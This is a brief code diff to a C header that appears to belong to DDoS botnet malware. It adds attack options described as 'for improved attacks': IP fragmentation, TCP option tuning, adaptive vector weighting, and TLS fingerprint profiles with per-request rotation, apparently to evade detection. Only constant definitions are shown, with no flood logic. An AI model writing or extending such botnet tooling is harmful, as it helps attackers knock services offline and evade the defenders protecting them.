@@ -58,6 +58,15 @@
 #define ATK_OPT_DPORT_UDP       20  /* UDP port for AXIS-UDP */
 #define ATK_OPT_DPORT_GRE       21  /* GRE port for AXIS-TCP/AXIS-UDP */
 
+/* New options for improved attacks */
+#define ATK_OPT_FRAGMENT        22  /* Enable IP fragmentation */
+#define ATK_OPT_TCP_MSS         23  /* TCP MSS option value */
+#define ATK_OPT_TCP_WSCALE      24  /* TCP window scale value */
+#define ATK_OPT_TCP_TIMESTMP    25  /* Enable TCP timestamps */
+#define ATK_OPT_ADAPTIVE        26  /* Enable adaptive vector weighting */
+#define ATK_OPT_TLS_FINGERPRINT 27  /* TLS fingerprint profile */
+#define ATK_OPT_FINGERPRINT_ROT 28  /* Enable per-request fingerprint rotation */
+
 /* ============================================================================
  * ATTACK STRUCTURES
  * ============================================================================ */
